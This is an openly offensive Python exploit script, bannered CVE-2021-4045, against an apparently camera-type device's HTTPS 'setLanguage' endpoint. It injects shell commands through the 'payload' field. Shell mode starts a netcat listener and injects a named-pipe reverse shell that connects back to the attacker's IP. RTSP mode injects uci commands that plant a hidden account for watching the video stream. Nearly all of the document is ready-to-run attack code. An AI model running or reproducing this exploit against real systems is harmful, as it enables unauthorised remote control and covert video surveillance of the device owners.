import argparse
import requests, urllib3, sys, threading, os, hashlib
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class CustomFormatter(argparse.ArgumentDefaultsHelpFormatter, argparse.RawDescriptionHelpFormatter):
    pass

parser = argparse.ArgumentParser(
    description='Your script description',
    formatter_class=CustomFormatter,
    epilog='''\
=========================================================================================
    @Pl4inT3XT
   _______      ________    ___   ___ ___  __        _  _    ___  _  _   _____ 
  / ____\ \    / /  ____|  |__ \ / _ \__ \/_ |      | || |  / _ \| || | | ____|
 | |     \ \  / /| |__ ______ ) | | | | ) || |______| || |_| | | | || |_| |__  
 | |      \ \/ / |  __|______/ /| | | |/ / | |______|__   _| | | |__   _|___ \ 
 | |____   \  /  | |____    / /_| |_| / /_ | |         | | | |_| |  | |  ___) |
  \_____|   \/   |______|  |____|\___/____||_|         |_|  \___/   |_| |____/  

=========================================================================================
            '''
)
parser.add_argument("-M", help="attack mode : shell | rtsp", required=True)
parser.add_argument("-U", help="RTSP_USER", required=False)
parser.add_argument("-P", help="RTSP_PASSWORD", required=False)
parser.add_argument("-C", help="RTSP_CIPHERTEXT", required=False)
parser.add_argument("-H", help="victim ip address", required=True)
parser.add_argument("-A", help="attacker ip address", required=True)
parser.add_argument("-p", help="Listening port", type=int, required=True)
parser.add_argument("-v", help="increase output verbosity", action="store_true")
args = parser.parse_args()


url = "https://" + args.H + ":443/"
attack_mode = args.M
rstp_user = args.U
rstp_password = args.P
rtsp_ciphertext = args.C
victim_ip = args.H
attacker_ip = args.A
verbosity = args.v
PORT = args.p

NC_COMMAND = 'nc -lv %d' % PORT
REVERSE_SHELL = 'rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f'

def display_banner():
    print("""

============================================================================================

    @Pl4inT3XT
   _______      ________    ___   ___ ___  __        _  _    ___  _  _   _____ 
  / ____\ \    / /  ____|  |__ \ / _ \__ \/_ |      | || |  / _ \| || | | ____|
 | |     \ \  / /| |__ ______ ) | | | | ) || |______| || |_| | | | || |_| |__  
 | |      \ \/ / |  __|______/ /| | | |/ / | |______|__   _| | | |__   _|___ \ 
 | |____   \  /  | |____    / /_| |_| / /_ | |         | | | |_| |  | |  ___) |
  \_____|   \/   |______|  |____|\___/____||_|         |_|  \___/   |_| |____/

============================================================================================  

""")

def shell_mode():
    print("[+] Listening on port %d..." % PORT)
    t = threading.Thread(target=os.system, args=(NC_COMMAND,))
    t.start()
        
    print("[+] Sending reverse shell to %s...\n" % victim_ip)
    json = {"method": "setLanguage", "params": {"payload": "';" + REVERSE_SHELL % (attacker_ip, PORT) + ";'"}}

    try:
        response = requests.post(url, json=json, verify=False)
    except requests.exceptions.RequestException as e:
        if isinstance(e, requests.exceptions.ConnectionError):
            error_message = "Unable to connect to the server. Please check your internet connection."
        elif isinstance(e, requests.exceptions.Timeout):
            error_message = "The request timed out. Please try again later."
        elif isinstance(e, requests.exceptions.HTTPError):
            error_message = f"HTTP Error: {e.response.status_code} - {e.response.text}"
        else:
            error_message = "An unexpected error occurred. Please contact support."
        print(f"[---] Error: {error_message}")

def rstp_mode():
    if not rstp_user and rstp_password and rtsp_ciphertext:
        parser.error("provide username, password and ciphertext")
    else:
        print("[+] Setting up RTSP video stream...")
        md5_rtsp_password = hashlib.md5(rstp_password.encode()).hexdigest().upper()
        json = {"method": "setLanguage", "params": {"payload": "';uci set user_management.third_account.username=%s;uci set user_management.third_account.passwd=%s;uci set user_management.third_account.ciphertext=%s;uci commit user_management;/etc/init.d/cet terminate;/etc/init.d/cet resume;'" % (rstp_user, md5_rtsp_password, rtsp_ciphertext)}}
        try:
            response = requests.post(url, json=json, verify=False)
        except requests.exceptions.RequestException as e:
            if isinstance(e, requests.exceptions.ConnectionError):
                error_message = "Unable to connect to the server. Please check your internet connection."
            elif isinstance(e, requests.exceptions.Timeout):
                error_message = "The request timed out. Please try again later."
            elif isinstance(e, requests.exceptions.HTTPError):
                error_message = f"HTTP Error: {e.response.status_code} - {e.response.text}"
            else:
                error_message = "An unexpected error occurred. Please contact support."
            print(f"[---] Error: {error_message}")

        print("[+] RTSP video stream available at rtsp://%s/stream2" % victim_ip)
        print("[+] RTSP username: %s" % rstp_user)
        print("[+] RTSP password: %s" % rstp_password)    

if __name__ == "__main__":

    try:
        display_banner()
        if attack_mode == "shell":
            shell_mode()
        else:
            rstp_mode()
    
    except argparse.ArgumentError:
        parser.print_help()